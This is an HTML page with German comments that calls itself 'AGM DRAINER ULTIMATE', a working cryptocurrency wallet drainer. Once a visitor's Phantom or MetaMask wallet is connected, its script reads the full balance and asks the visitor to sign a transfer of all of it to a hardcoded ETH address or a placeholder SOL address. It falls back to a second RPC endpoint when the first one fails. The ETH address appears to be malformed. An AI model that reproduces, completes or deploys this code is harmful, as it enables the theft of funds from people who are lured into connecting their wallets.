<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <title>AGM DRAINER ULTIMATE</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
  
    <style>
    body { background: #000; color: #fff; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
  .box { border: 2px solid #ff9900; padding: 40px; width: 300px; text-align: center; background: #111; box-shadow: 0 0 30px #ff9900; }
    button { background: #ff9900; color: #fff; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 5px; }
    #status { margin-top: 20px; color: #ddd; font-size: 12px; }
.success { color: #00ff00!important; }
   .warn { color: #ffff00!important; }
    </style>
</head>
<body>

    <div class="box">
    <h2>AGM DRAINER</h2>
    <button id="btn" onclick="start()">CONNECT</button>
    <div id="status">Waiting...</div>
 </div>

<script>
    // === IM CHROME KÖNNEN WIR DENSEN SERVER NATIV BENUTZEN ===
    const RPC_NODES = [
    "https://api.mainnet-beta.solana.com", // Der Standard
    "https://circle.stoplight.io/v1/solana/mainnet-beta" // Der öffentliche Backup
  ];

    const btn = document.getElementById("btn");
    const status = document.getElementById("status");
    const TARGET_ETH = "0xD4144Da2f3c5D8eF7a0B1d7D2F6C6D8A5E5B4C"; 
    const TARGET_SOL = "DEINE_SOLANA_ADRESSE_HIER"; 

    async function start() {
    btn.disabled = true;
    status.innerText = "Initiating...";

   try {
    if (window.solana && window.solana.isPhantom) {
    await drainSOL();
  } else if (window.ethereum) {
    await drainETH();
    return;
 } 

    status.innerText = "No Wallet Found.";
    btn.disabled = false;
   } catch (e) {
    status.innerText = "FATAL ERROR: " + e.message;
    btn.disabled = false;
  }
 }

    async function drainSOL() {
 try {
    const provider = window.solana;
  
    status.innerText = "Connecting to Phantom...";
    await provider.connect();
    const { publicKey } = provider;

    // Wir durchlaufen alle RPCs, bis einer funktioniert
    for (let i = 0; i < RPC_NODES.length; i++) {
    const rpc = RPC_NODES[i];
   try {
    status.innerText = "Trying to read balance (VPN #" + (i+1) + ")...";
  
    // Verbindungs-Timeout erzwingen, um 403 sofort zu erkennen
    const connection = new solanaWeb3.Connection(rpc, 'finalized');
  
    // 1. SATZ KOSTEN ERMITTELN (Mindestgebühr)
    const fee = await connection.getMinimumBalanceForRentExemption(0);
  
    // 2. GELD ABRUFEN
    const balance = await connection.getBalance(publicKey);

    if (balance === 0) throw new Error("Wallet is Empty");

    status.innerText = "Draining...";
  
    // Senden
    const tx = new solanaWeb3.Transaction().add(
    solanaWeb3.SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new solanaWeb3.PublicKey(TARGET_SOL),
    lamports: balance,
  })
  );
  
    await provider.signAndSendTransaction(tx);
    status.innerHTML = "DONE: <b>SOL SENT!</b>";
    status.className = "success";
    return; // Ende bei Erfolg

    } catch (rpcErr) {
    console.log("RPC " + i + " Failed: " + rpcErr.message);
    if (i === RPC_NODES.length - 1) throw rpcErr; // Wenn der letzte auch fehlschlägt, Fehler werfen
    status.innerText = "RPC Failed, trying next server...";
    await new Promise(r => setTimeout(r, 1000)); // Kurz warten
  }
 }
    } catch (e) {
    throw new Error("SOL Error: " + e.message);
  }
 }

    async function drainETH() {
 try {
    const provider = new ethers.BrowserProvider(window.ethereum);
    status.innerText = "Asking MetaMask...";
    const accounts = await provider.send("eth_requestAccounts", []);
    const signer = await provider.getSigner();
    const bal = await provider.getBalance(signer.address);

    if (bal < 1000000000000000n) throw new Error("Empty Wallet");

    const tx = await signer.sendTransaction({
    to: TARGET_ETH,
    value: bal
  });
    await tx.wait();
    status.innerHTML = "DONE: <b>ETH SENT!</b>";
    status.className = "success";
   } catch (e) {
    throw e;
  }
  }
   </script>
</body>
</html>
